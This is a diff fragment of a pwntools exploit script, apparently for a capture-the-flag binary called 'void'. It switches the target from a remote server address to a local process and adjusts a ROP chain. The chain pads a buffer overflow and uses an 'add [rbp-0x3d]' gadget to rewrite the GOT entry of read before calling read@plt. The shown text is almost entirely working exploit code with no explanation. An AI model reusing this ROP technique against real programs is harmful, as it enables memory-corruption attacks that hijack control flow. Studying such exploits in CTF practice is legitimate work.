@@ -12,8 +12,9 @@ libc = ELF('./glibc/libc.so.6')
 
 padding = offset*b'A'
 
-ip, port='161.35.168.118', 30070
-io = remote(ip,port)
+#ip, port='161.35.168.118', 30070
+#io = remote(ip,port)
+io = process('./void')
 
 #0x0000000000401108 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
 
@@ -51,6 +52,7 @@ read_plt = elf.sym['read']
 rop_chain = p64(0x004011b2) + p64(offset) + p64(read_got+0x3d) + p64(0)*4
 rop_chain += p64(0x401108)
 rop_chain += p64(read_plt)
+#rop_chain += p64(read_got)  #error
 
 payload = padding + rop_chain
 
